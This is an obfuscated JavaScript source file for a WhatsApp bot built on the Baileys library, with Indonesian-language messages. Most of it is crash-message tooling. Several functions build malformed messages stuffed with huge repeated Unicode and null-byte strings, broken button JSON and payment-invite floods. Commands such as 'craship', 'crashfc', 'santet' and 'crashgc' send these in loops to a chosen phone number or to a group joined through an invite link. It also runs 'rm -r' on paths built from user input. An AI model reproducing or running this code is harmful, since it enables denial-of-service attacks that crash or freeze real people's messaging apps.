require("./config");
const {
  delay,
  downloadContentFromMessage,
  makeInMemoryStore,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const {
  isUrl,
  sleep,
  await,
  getBuffer,
  getGroupAdmins,
  fetchJson
} = require("./lib/myfunc.js");
const fs = require('fs');
const util = require('util');
const chalk = require("chalk");
const fetch = require("node-fetch");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
ownerNamee = global.Himalagle;
botNamee = global.Noname-BotMD;
Leccy_Auto_Typing = global.Auto_Typing;
Leccy_Auto_Recording = global.Auto_Recording;
Leccy_Auto_RecordType = global.Auto_RecordType;
Leccy_Auto_ReadPesan = global.Auto_ReadPesan;
global.locID = '1';
global.eggID = '15';
let premium = JSON.parse(fs.readFileSync("./db/premium.json"));
let ownerss = JSON.parse(fs.readFileSync("./db/owners.json"));
mute_bot = false;
module.exports = async (_0x4e2417, _0x315745, _0x258814) => {
  try {
    const {
      fromMe: _0x1b4660,
      isBaileys: _0x2e4152,
      isQuotedMsg: _0x24e2e3,
      quotedMsg: _0x52ef07,
      mentioned: _0x2f55e1
    } = _0x315745;
    if (_0x315745.key && _0x315745.key.remoteJid === "status@broadcast") {
      return;
    }
    const _0x20831e = getContentType(_0x315745.message);
    const _0x477074 = _0x315745.key.remoteJid;
    const _0x27b8bd = _0x20831e === "conversation" && _0x315745.message.conversation ? _0x315745.message.conversation : _0x20831e == "imageMessage" && _0x315745.message.imageMessage.caption ? _0x315745.message.imageMessage.caption : _0x20831e == "documentMessage" && _0x315745.message.documentMessage.caption ? _0x315745.message.documentMessage.caption : _0x20831e == "videoMessage" && _0x315745.message.videoMessage.caption ? _0x315745.message.videoMessage.caption : _0x20831e == "extendedTextMessage" && _0x315745.message.extendedTextMessage.text ? _0x315745.message.extendedTextMessage.text : _0x20831e == 'buttonsResponseMessage' && _0x315745.message.buttonsResponseMessage.selectedButtonId ? _0x315745.message.buttonsResponseMessage.selectedButtonId : _0x20831e == 'templateButtonReplyMessage' && _0x315745.message.templateButtonReplyMessage.selectedId ? _0x315745.message.templateButtonReplyMessage.selectedId : '';
    const _0x5cf8f7 = /^[°•π÷●¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(_0x27b8bd) ? _0x27b8bd.match(/^[°•π÷●¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.';
    const _0x55733f = _0x27b8bd.replace(_0x5cf8f7, '').trim().split(/ +/).shift().toLowerCase();
    const _0x212998 = _0x27b8bd.trim().split(/ +/).slice(0x1);
    const _0x41589b = _0x477074.endsWith('@g.us');
    const _0x190f4d = _0x4e2417.user.id.split(':')[0x0];
    const _0x170bf2 = _0x315745.key.fromMe ? _0x4e2417.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x4e2417.user.id : _0x315745.key.participant || _0x315745.key.remoteJid;
    const _0xb5c97d = _0x170bf2.split('@')[0x0];
    const _0x347b7b = _0x190f4d.includes(_0xb5c97d);
    const _0x107eff = global.devNumber.includes(_0xb5c97d);
    const _0x254696 = [global.devNumber, ...premium].includes(_0xb5c97d);
    const _0x20c9ce = ownerss.includes(_0xb5c97d);
    const _0x30ec16 = _0x41589b ? await _0x4e2417.groupMetadata(_0x477074) : '';
    const _0x431e0a = _0x41589b ? _0x30ec16.subject : '';
    const _0x4feebe = _0x41589b ? _0x30ec16.participants : '';
    const _0x362b59 = _0x41589b ? getGroupAdmins(_0x4feebe) : '';
    const _0xba057a = _0x362b59.includes(_0x190f4d + "@s.whatsapp.net") || false;
    const _0x4dbbb6 = _0x362b59.includes(_0x170bf2) || false;
    const _0x245e81 = function (_0x553f21) {
      var _0x553f21 = Number(_0x553f21);
      var _0x16d5c7 = Math.floor(_0x553f21 / 86400);
      var _0x2e69ad = Math.floor(_0x553f21 % 86400 / 0xe10);
      var _0x4f3610 = Math.floor(_0x553f21 % 0xe10 / 0x3c);
      var _0x39dc7f = Math.floor(_0x553f21 % 0x3c);
      var _0x43c86c = _0x16d5c7 > 0x0 ? _0x16d5c7 + (_0x16d5c7 == 0x1 ? " Hari, " : " Hari, ") : '';
      var _0x1bdb0f = _0x2e69ad > 0x0 ? _0x2e69ad + (_0x2e69ad == 0x1 ? " Jam, " : " Jam, ") : '';
      var _0x202f09 = _0x4f3610 > 0x0 ? _0x4f3610 + (_0x4f3610 == 0x1 ? " Menit, " : " Menit, ") : '';
      var _0x9514df = _0x39dc7f > 0x0 ? _0x39dc7f + (_0x39dc7f == 0x1 ? " Detik" : " Detik") : '';
      return _0x43c86c + _0x1bdb0f + _0x202f09 + _0x9514df;
    };
    const _0x385943 = async _0x278a8a => {
      await _0x4e2417.sendMessage(_0x477074, {
        'text': _0x278a8a
      }, {
        'quoted': _0x315745
      });
    };
    const _0x41f71b = async _0x528227 => {
      await _0x4e2417.sendMessage(_0x477074, {
        'text': _0x528227
      }, {
        'quoted': _0x315745
      });
    };
    const _0x55d456 = async _0x149bce => {
      _0x4e2417.sendMessage(_0x477074, {
        'react': {
          'text': _0x149bce,
          'key': _0x315745.key
        }
      });
    };
    const _0x317514 = async (_0x1e5391, _0x556c77 = []) => {
      _0x4e2417.sendMessage(_0x477074, {
        'text': _0x1e5391,
        'mentions': _0x556c77
      }, {
        'quoted': _0x315745
      });
    };
    const _0x230bcf = _0x4689fb => {
      let _0x536d87 = '';
      const _0x4abbe0 = "1234567890".length;
      for (let _0x5b529f = 0x0; _0x5b529f < _0x4689fb; _0x5b529f++) {
        _0x536d87 += "1234567890".charAt(Math.floor(Math.random() * _0x4abbe0));
      }
      return _0x536d87;
    };
    function _0x109914(_0x236921, _0x57253c = [], _0x1805bf) {
      if (_0x1805bf == null || _0x1805bf == undefined || _0x1805bf == false) {
        let _0x1d6044 = _0x4e2417.sendMessage(_0x477074, {
          'text': _0x236921,
          'mentions': _0x57253c
        }, {
          'quoted': _0x315745
        });
        return _0x1d6044;
      } else {
        let _0x26eb8a = _0x4e2417.sendMessage(_0x477074, {
          'text': _0x236921,
          'mentions': _0x57253c
        }, {
          'quoted': _0x315745
        });
        return _0x26eb8a;
      }
    }
    function _0x26c63e(_0x57354c, _0x2d0bd1 = [], _0x1e6651) {
      if (_0x1e6651 == null || _0x1e6651 == undefined || _0x1e6651 == false) {
        let _0x54af57 = _0x4e2417.sendMessage(_0x477074, {
          'text': _0x57354c,
          'mentions': _0x2d0bd1
        }, {
          'quoted': _0x315745
        });
        return _0x54af57;
      } else {
        let _0x20e606 = _0x4e2417.sendMessage(_0x477074, {
          'text': _0x57354c,
          'mentions': _0x2d0bd1
        }, {
          'quoted': _0x315745
        });
        return _0x20e606;
      }
    }
    async function _0x25ff0b(_0x1ae695) {
      var _0x17daec = generateWAMessageFromContent(_0x1ae695, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(0xd6d8),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x1ae695
      });
      await _0x4e2417.relayMessage(_0x1ae695, _0x17daec.message, {
        'participant': {
          'jid': _0x1ae695
        },
        'messageId': _0x17daec.key.id
      });
    }
    async function _0x17c83c(_0x2fd8c9) {
      var _0x4c76cd = generateWAMessageFromContent(_0x2fd8c9, proto.Message.fromObject({
        'listMessage': {
          'title': '𝖘𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌' + "\0".repeat(0xf423f),
          'footerText': '.',
          'description': '.',
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "anjay",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': '0@s.whatsapp.net'
          }
        },
        'footer': 'puki',
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': true
        }
      }), {
        'userJid': _0x2fd8c9
      });
      await _0x4e2417.relayMessage(_0x2fd8c9, _0x4c76cd.message, {
        'participant': {
          'jid': _0x2fd8c9
        },
        'messageId': _0x4c76cd.key.id
      });
    }
    async function _0x56413c(_0x1f7992) {
      var _0x1b561f = generateWAMessageFromContent(_0x1f7992, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': "𝕾𝖙𝖗𝖆𝖛𝖆𝕺𝖋𝖈"
              },
              'body': {
                'text': "𝕾𝖙𝖗𝖆𝖛𝖆 𝕭𝖚𝖌"
              },
              'footer': {
                'text': "𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕"
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }, {
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }, {
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }],
                'messageParamsJson': ''.repeat(0xf423f)
              }
            }
          }
        }
      }), {
        'userJid': _0x1f7992
      });
      await _0x4e2417.relayMessage(_0x1f7992, _0x1b561f.message, {
        'participant': {
          'jid': _0x1f7992
        },
        'messageId': _0x1b561f.key.id
      });
    }
    async function _0x1ddc14(_0xded6ff) {
      let _0x4ca086 = generateWAMessageFromContent(_0xded6ff, {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': proto.Message.InteractiveMessage.create({
              'body': proto.Message.InteractiveMessage.Body.create({
                'text': ''
              }),
              'footer': proto.Message.InteractiveMessage.Footer.create({
                'text': 'ྦྷ'.repeat(0x3d090)
              }),
              'header': proto.Message.InteractiveMessage.Header.create({
                'title': '',
                'subtitle': '',
                'hasMediaAttachment': false
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : \" \", url : , merchant_url : \" \"}"
                }],
                'messageParamsJson': "\0".repeat(0x186a0)
              })
            })
          }
        }
      }, {});
      _0x4e2417.relayMessage(_0xded6ff, _0x4ca086.message, {
        'messageId': _0x4ca086.key.id
      });
    }
    async function _0x20072f(_0x2d5344) {
      var _0x3b8edd = generateWAMessageFromContent(_0x2d5344, proto.Message.fromObject({
        'extendedTextMessage': {
          'text': "𝕾𝖙𝖗𝖆𝖛𝖆-𝕭𝖚𝖌",
          'contextInfo': {
            'stanzaId': _0x2d5344,
            'participant': _0x2d5344,
            'quotedMessage': {
              'conversation': "؂ن؃؄ٽ؂ن؃؄ٽ".repeat(0x9c40)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }), {
        'userJid': _0x2d5344
      });
      await _0x4e2417.relayMessage(_0x2d5344, _0x3b8edd.message, {
        'participant': {
          'jid': _0x2d5344
        },
        'messageId': _0x3b8edd.key.id
      });
    }
    async function _0x2e5654(_0x4dc409) {
      await _0x4e2417.relayMessage(_0x4dc409, {
        'paymentInviteMessage': {
          'serviceType': "LECCY",
          'expiryTimestamp': Date.now() + 86400000000
        }
      }, {
        'participant': {
          'jid': _0x4dc409
        }
      });
    }
    async function _0x338e53(_0x326f16, _0x53ec25) {
      for (let _0x5d6ac0 = 0x0; _0x5d6ac0 < _0x53ec25; _0x5d6ac0++) {
        _0x1ddc14(_0x326f16);
        _0x1ddc14(_0x326f16);
        _0x1ddc14(_0x326f16);
      }
    }
    async function _0x48df22(_0x32a7ca, _0x189208) {
      for (let _0x2e39c1 = 0x0; _0x2e39c1 < _0x189208; _0x2e39c1++) {
        _0x17c83c(_0x32a7ca);
        _0x25ff0b(_0x32a7ca);
        _0x56413c(_0x32a7ca);
      }
    }
    async function _0x4eba09(_0x361a32, _0x2964c5) {
      for (let _0x3297af = 0x0; _0x3297af < _0x2964c5; _0x3297af++) {
        _0x20072f(_0x361a32);
        _0x2e5654(_0x361a32);
        _0x20072f(_0x361a32);
        _0x2e5654(_0x361a32);
      }
    }
    if (Leccy_Auto_Typing) {
      await delay(0x1f4);
      _0x4e2417.sendPresenceUpdate("composing", _0x477074);
    }
    if (Leccy_Auto_Recording) {
      await delay(0x1f4);
      _0x4e2417.sendPresenceUpdate("recording", _0x477074);
    }
    if (Leccy_Auto_ReadPesan) {
      await delay(0x1f4);
      _0x4e2417.readMessages([_0x315745.key]);
    }
    if (mute_bot) {
      if (_0x41589b) {
        return;
      }
      if (!_0x107eff && !_0x20c9ce && !_0x347b7b) {
        return;
      }
    }
    if (_0x41589b) {
      if (!_0x107eff && !_0x20c9ce && !_0x347b7b && !_0x254696) {
        return;
      }
      console.log(chalk.bgBlack(chalk.redBright("\n===========================================\n")));
      console.log(chalk.black(chalk.white("Group Chat :")));
      console.log(chalk.black(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(_0x27b8bd || _0x20831e)) + "\n" + chalk.magenta("- From :"), chalk.green(_0x315745.pushName), chalk.yellow(_0x170bf2.split('@')[0x0]) + "\n" + chalk.blueBright("=> in"), chalk.green(_0x431e0a, _0x477074));
    } else {
      if (!_0x107eff && !_0x20c9ce && !_0x347b7b && !_0x254696) {
        return;
      }
      console.log(chalk.bgBlack(chalk.redBright("\n===========================================\n")));
      console.log(chalk.black(chalk.white("Private Chat :")));
      console.log(chalk.bgBlack(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(_0x27b8bd || _0x20831e)) + "\n" + chalk.magenta("- From :"), chalk.green(_0x315745.pushName), chalk.yellow(_0x170bf2.split('@')[0x0]) + "\n");
    }
    switch (_0x55733f) {
      case 'runtime':
        if (!_0x107eff) {
          return _0x385943("This feature can only be used by the owner");
        }
        _0x385943(_0x245e81(process.uptime()));
        break;
      case "mute":
        if (!_0x107eff) {
          return _0x385943("This feature can only be used by the owner");
        }
        if (mute_bot == true) {
          return _0x385943("*The bot was in self mode before*");
        }
        mute_bot = true;
        _0x385943("*Successfully Activated Self Mode!*");
        break;
      case "unmute":
        if (!_0x107eff) {
          return _0x385943("This feature can only be used by the owner");
        }
        if (mute_bot == false) {
          return _0x385943("*The bot has been in self mode before*");
        }
        mute_bot = false;
        _0x385943("*successfully Turned Off Self Mode!*");
        break;
      case 'stopjadibot':
        if (!fs.existsSync("./database/jadibot/" + _0x170bf2.split('@')[0x0])) {
          return _0x385943("*Maaf, Kamu Tidak Terdaftar Jadibot!*");
        }
        exec("rm -r database/jadibot/" + _0x170bf2.split('@')[0x0]);
        _0x385943("*succesfully delete session ✓*");
        break;
      case "del-sesi":
        {
          if (!q) {
            return _0x385943("EX: .d-sesi 628xxxx");
          }
          if (!_0x107eff) {
            return _0x385943("This feature can only be used by the owner");
          }
          num = q.replace(/[^0-9]/g, '');
          if (!fs.existsSync('./database/jadibot/' + num)) {
            return _0x385943("*Maaf, Nomor itu Tidak Terdaftar Jadibot!*");
          }
          exec("rm -r database/jadibot/" + num);
          mensesi = num + "@s.whatsapp.net";
          _0x109914("*succesfully delete session* @" + mensesi.split('@')[0x0], [mensesi]);
        }
        break;
      case "resetjadibot":
        if (!_0x107eff) {
          return _0x385943("This feature can only be used by the owner");
        }
        exec("rm -r database/jadibot/" + _0x170bf2.split('@')[0x0]);
        _0x385943("*succesfully restart session ✓*");
        await sleep(0xbb8);
        process.exit();
        break;
      case "listjadibot":
        if (!_0x107eff) {
          return _0x385943("This feature can only be used by the owner");
        }
        xxjdb = 0x1;
        const {
          jadibot: _0x2096b4,
          conns: _0x129a68
        } = require("./lib/jadibot");
        try {
          let _0x427092 = [...new Set([...global.conns.filter(_0x3dfe40 => _0x3dfe40.user).map(_0x28150e => _0x28150e.user)])];
          te = "▬▭▬▭▬▭▬▭▬▭▬▭\n*LISTJADIBOT-TREE*\n*Total Users* : " + _0x427092.length + "\n▬▭▬▭▬▭▬▭▬▭▬▭\n";
          for (let _0x2bcf08 of _0x427092) {
            y = await _0x4e2417.decodeJid(_0x2bcf08.id);
            te += "*⭔UserID* : " + ('' + xxjdb++) + "\n";
            te += "*⭔Number* : @" + y.split('@')[0x0] + "\n▬▭▬▭▬▭▬▭▬▭▬▭\n";
          }
          _0x4e2417.sendTextWithMentions(_0x477074, te, _0x315745);
        } catch (_0x3ca444) {
          _0x385943("Belum Ada User Yang Jadibot");
        }
        break;
      case 'jadibot':
        {
          if (!q) {
            return _0x385943("EX: .jadibot 628xxxx");
          }
          if (!_0x107eff) {
            return _0x385943("This feature can only be used by the owner");
          }
          num = q.replace(/[^0-9]/g, '');
          myown = _0x190f4d + "@s.whatsapp.net";
          mynum = num + "@s.whatsapp.net";
          if (fs.existsSync("./database/jadibot/" + num)) {
            return _0x109914("*mohon maaf* @" + mynum.split('@')[0x0] + " ^_^\n*session users masih terdaftar.*\n\n*silahkan ketik* .stopjadibot\n*untuk menghapus session ✓*", [mynum]);
          }
          _0x385943("*We are processing your request.*");
          const {
            jadibot: _0x415382,
            conns: _0x745201
          } = require('./lib/jadibot');
          await sleep(0xdac);
          txtt = "*MASUKKAN CODE PAIRING DIBAWAH INI*\n*UNTUK MENJADI BOT SEMENTARA ✓*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code pairing dibawah ini\n\n*Code Pairing :* `" + global.codepairing + "`\n\n*Note:*\n_Code dapat expired kapan saja._\n_Jika code error silahkan ketik_ ⇩\n\n========[  !stopjadibot  ]========";
          _0x4e2417.sendMessage(mynum, {
            'text': txtt
          }).then(() => _0x4e2417.sendMessage(_0x477074, {
            'text': "*Succesfully Send Pairing Code* @" + mynum.split('@')[0x0],
            'mentions': [mynum]
          })).then(() => _0x4e2417.sendMessage(_0x170bf2, {
            'text': global.codepairing
          }, {
            'quoted': _0x315745
          }));
        }
        break;
      case 'listprem':
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b) {
            return;
          }
          let _0x2dbcd9 = JSON.parse(fs.readFileSync("./db/premium.json"));
          if (_0x2dbcd9.length == 0x0) {
            return _0x385943("*there are not Premium Users in the database*");
          }
          var _0x1766bb = "_*LIST USER PREMIUM*_\n*Total User :* " + _0x2dbcd9.length + "\n\n";
          var _0xe03a91 = 0x1;
          for (let _0x52abd8 of _0x2dbcd9) {
            _0x1766bb += "Users : " + _0xe03a91++ + "\nNumber : @" + _0x52abd8 + "\n\n";
          }
          _0x4e2417.sendTextWithMentions(_0x477074, _0x1766bb, _0x315745);
        }
        break;
      case "addprem":
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b) {
            return;
          }
          if (!_0x212998[0x0]) {
            return _0x385943("Use " + (_0x5cf8f7 + _0x55733f) + " number\nExample " + (_0x5cf8f7 + _0x55733f) + " 628xxxxx");
          }
          bnnd = q.replace(/[^0-9]/g, '');
          let _0x502099 = await _0x4e2417.onWhatsApp(bnnd + "@s.whatsapp.net");
          if (_0x502099.length == 0x0) {
            return _0x385943("_Enter A Valid And Registered Number On WhatsApp!!_");
          }
          if (premium.includes(bnnd)) {
            return _0x385943("_Nomor Tersebut Sudah Premium !!_");
          }
          premium.push(bnnd);
          fs.writeFileSync("./db/premium.json", JSON.stringify(premium));
          let _0x4a8d30 = bnnd + "@s.whatsapp.net";
          _0x109914("*Success Added @" + _0x4a8d30.split('@')[0x0] + " To the Premium Users Database*", [_0x4a8d30]);
          await sleep(0x9c4);
          _0x4e2417.sendMessage(_0x4a8d30, {
            'text': "*Congratulations users, you can now use premium features*"
          });
        }
        break;
      case "delprem":
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b) {
            return;
          }
          if (!_0x212998[0x0]) {
            return _0x385943("Use " + (_0x5cf8f7 + _0x55733f) + " number\nExample " + (_0x5cf8f7 + _0x55733f) + " 628xxxxx");
          }
          ya = q.replace(/[^0-9]/g, '');
          unp = premium.indexOf(ya);
          if (!premium.includes(ya)) {
            return _0x385943("_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Users Premium!!_");
          }
          premium.splice(unp, 0x1);
          fs.writeFileSync('./db/premium.json', JSON.stringify(premium));
          let _0x537077 = ya + "@s.whatsapp.net";
          _0x109914("*Deleting Success @" + _0x537077.split('@')[0x0] + " In the Users Premium database*", [_0x537077]);
          await sleep(0x9c4);
          _0x4e2417.sendMessage(_0x537077, {
            'text': "*Well, it's a shame, you can no longer access premium features because they were deleted*"
          });
        }
        break;
      case 'listown':
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b) {
            return;
          }
          let _0x38452c = JSON.parse(fs.readFileSync("./db/owners.json"));
          if (_0x38452c.length == 0x0) {
            return _0x385943("*there are not Premium Users in the database*");
          }
          var _0x1766bb = "_*LIST USER PREMIUM*_\n*Total User :* " + _0x38452c.length + "\n\n";
          var _0xe03a91 = 0x1;
          for (let _0x51672a of _0x38452c) {
            _0x1766bb += "Users : " + _0xe03a91++ + "\nNumber : @" + _0x51672a + "\n\n";
          }
          _0x4e2417.sendTextWithMentions(_0x477074, _0x1766bb, _0x315745);
        }
        break;
      case "addown":
        {
          if (!_0x107eff && !_0x347b7b) {
            return;
          }
          if (!_0x212998[0x0]) {
            return _0x385943("Use " + (_0x5cf8f7 + _0x55733f) + " number\nExample " + (_0x5cf8f7 + _0x55733f) + " 628xxxxx");
          }
          bnnd = q.replace(/[^0-9]/g, '');
          let _0x488173 = await _0x4e2417.onWhatsApp(bnnd + '@s.whatsapp.net');
          if (_0x488173.length == 0x0) {
            return _0x385943("_Enter A Valid And Registered Number On WhatsApp!!_");
          }
          if (ownerss.includes(bnnd)) {
            return _0x385943("_Nomor Tersebut Sudah Menjadi Owners !!_");
          }
          ownerss.push(bnnd);
          fs.writeFileSync("./db/owners.json", JSON.stringify(ownerss));
          let _0x42ef7c = bnnd + '@s.whatsapp.net';
          _0x109914("*Success Added @" + _0x42ef7c.split('@')[0x0] + " To the Owners Users Database*", [_0x42ef7c]);
          await sleep(0x9c4);
          _0x4e2417.sendMessage(_0x42ef7c, {
            'text': "*Congratulations users, you can now use owners features*"
          });
        }
        break;
      case 'delown':
        {
          if (!_0x107eff && !_0x347b7b) {
            return;
          }
          if (!_0x212998[0x0]) {
            return _0x385943("Use " + (_0x5cf8f7 + _0x55733f) + " number\nExample " + (_0x5cf8f7 + _0x55733f) + " 628xxxxx");
          }
          ya = q.replace(/[^0-9]/g, '');
          unp = ownerss.indexOf(ya);
          if (!ownerss.includes(ya)) {
            return _0x385943("_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Owners Bot!!_");
          }
          ownerss.splice(unp, 0x1);
          fs.writeFileSync("./db/owners.json", JSON.stringify(ownerss));
          let _0x51ca3f = ya + '@s.whatsapp.net';
          _0x109914("*Deleting Success @" + _0x51ca3f.split('@')[0x0] + " In the Users owners database*", [_0x51ca3f]);
          await sleep(0x9c4);
          _0x4e2417.sendMessage(_0x51ca3f, {
            'text': "*Well, it's a shame, you can no longer access owners features because they were deleted*"
          });
        }
        break;
      case '🥀':
      case '🍁':
      case '🐉':
      case '🌷':
      case '🍒':
      case "🌶️":
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b && !_0x254696) {
            return;
          }
          galakujiku = q.replace(/[^0-9]/g, '');
          if (!galakujiku) {
            return _0x385943("*Format :*\n" + (_0x5cf8f7 + _0x55733f) + " 628xxxx");
          }
          if (galakujiku == global.devNumber.includes) {
            return;
          }
          if (galakujiku == "6285807405071") {
            return;
          }
          if (galakujiku == "6285807405071") {
            return;
          }
          let _0x1c2d9d = await _0x4e2417.onWhatsApp(galakujiku + "@s.whatsapp.net");
          if (_0x1c2d9d.length == 0x0) {
            return _0x385943("*The number is not registered in the WhatsApp application.*");
          }
          ha_wkwk = galakujiku + "@s.whatsapp.net";
          _0x385943("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x26c63e("*Succesfully Send " + _0x55733f + " To @" + ha_wkwk.split('@')[0x0] + ", With The Amount Of Spam 20*", [ha_wkwk]);
          await sleep(0x3e8);
          _0x48df22(ha_wkwk, 0xa);
        }
        break;
      case '🍅':
      case '🌹':
      case '🐲':
      case '🔥':
      case '🦖':
      case '🦕':
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b) {
            return;
          }
          if (!q) {
            return _0x385943("*Example :*\n" + _0x55733f + " 3");
          }
          if (isNaN(parseInt(q))) {
            return _0x385943("Jumlah Wajib Angka!!");
          }
          if (_0x477074 == global.devNumber.includes + "@s.whatsapp.net") {
            return;
          }
          if (_0x477074 == "6285807405071@s.whatsapp.net") {
            return;
          }
          if (_0x477074 == "6285807405071@s.whatsapp.net") {
            return;
          }
          inijumlaaaa = encodeURI(q) * 0x7;
          _0x55d456('⏳');
          await sleep(0x7d0);
          _0x55d456('✅');
          await sleep(0x3e8);
          _0x48df22(_0x477074, inijumlaaaa);
        }
        break;
      case "killip":
      case 'bomip':
      case "travass":
      case "gas_ip":
      case "docip":
      case "crashin":
      case "homeip":
      case "blankip":
      case 'craship':
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b && !_0x254696) {
            return;
          }
          galakujiku = q.replace(/[^0-9]/g, '');
          if (!galakujiku) {
            return _0x385943("*Format :*\n" + (_0x5cf8f7 + _0x55733f) + " 628xxxx");
          }
          if (galakujiku == global.devNumber.includes) {
            return;
          }
          if (galakujiku == "6285807405071") {
            return;
          }
          if (galakujiku == "6285807405071") {
            return;
          }
          let _0x2d0e40 = await _0x4e2417.onWhatsApp(galakujiku + '@s.whatsapp.net');
          if (_0x2d0e40.length == 0x0) {
            return _0x385943("*The number is not registered in the WhatsApp application.*");
          }
          ha_wkwk = galakujiku + '@s.whatsapp.net';
          _0x385943("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x26c63e("*Succesfully Send " + _0x55733f + " To @" + ha_wkwk.split('@')[0x0] + ", With The Amount Of Spam 25*", [ha_wkwk]);
          await sleep(0x3e8);
          _0x4eba09(ha_wkwk, 0xf);
        }
        break;
      case 'sendbug':
      case "trolifc":
      case "travas":
      case 'docgas':
      case "crashfc":
      case 'infinity':
      case "gaslec":
      case "xforce":
      case 'santet':
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b && !_0x254696) {
            return;
          }
          galakujiku = q.replace(/[^0-9]/g, '');
          if (!galakujiku) {
            return _0x385943("*Format :*\n" + (_0x5cf8f7 + _0x55733f) + " 628xxxx");
          }
          if (galakujiku == global.devNumber.includes) {
            return;
          }
          if (galakujiku == "6285807405071") {
            return;
          }
          if (galakujiku == '6285807405071') {
            return;
          }
          let _0x4aa1e8 = await _0x4e2417.onWhatsApp(galakujiku + "@s.whatsapp.net");
          if (_0x4aa1e8.length == 0x0) {
            return _0x385943("*The number is not registered in the WhatsApp application.*");
          }
          ha_wkwk = galakujiku + '@s.whatsapp.net';
          _0x385943("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x26c63e("*Succesfully Send " + _0x55733f + " To @" + ha_wkwk.split('@')[0x0] + ", With The Amount Of Spam 10*", [ha_wkwk]);
          await sleep(0x3e8);
          _0x48df22(ha_wkwk, 0xa);
        }
        break;
      case 'wargc':
      case "virdokgc":
      case 'xlecgc':
      case 'travagc':
      case "buggc":
      case "crashgc":
      case "bomgc":
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b) {
            return;
          }
          if (!q) {
            return _0x385943("*CARA MENGIRIM BUG GROUB*\n\n" + (_0x5cf8f7 + _0x55733f) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ Jika ingin mengirim bug dengan jumlah banyak, silahkan ketik sebagai berikut ini\n\nEx: ." + _0x55733f + " linkgc jumlahbug\n\nContoh:\n." + _0x55733f + " https://chat.whatsapp.com/xxxx 10\n\n©leccyofc");
          }
          _0x55d456('⏳');
          if (!q.split(" ")[0x0].includes('whatsapp.com')) {
            return _0x385943("Link Invalid!");
          }
          resjoin = q.split(" ")[0x0].split("https://chat.whatsapp.com/")[0x1];
          try {
            inijumlah = q.split(" ")[0x1] ? q.split(" ")[0x1] : '1';
            initarget = await _0x4e2417.groupAcceptInvite(resjoin);
            await sleep(0x9c4);
            _0x55d456('✅');
            await sleep(0x3e8);
            _0x338e53(initarget, inijumlah);
            await sleep(0x1388);
            _0x4e2417.groupLeave(initarget);
          } catch (_0x324948) {
            _0x385943(util.format(_0x324948));
          }
        }
        break;
      case "androidfc":
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b && !_0x254696) {
            return;
          }
          if (!q) {
            return _0x385943("*Format :*\n" + (_0x5cf8f7 + _0x55733f) + " 628xxxx,1");
          }
          target_orang = q.split(',')[0x0];
          jumla_spamm = q.split(',')[0x1] ? q.split(',')[0x1] : '2';
          if (isNaN(parseInt(jumla_spamm))) {
            return _0x385943("Jumlah wajib angka!!");
          }
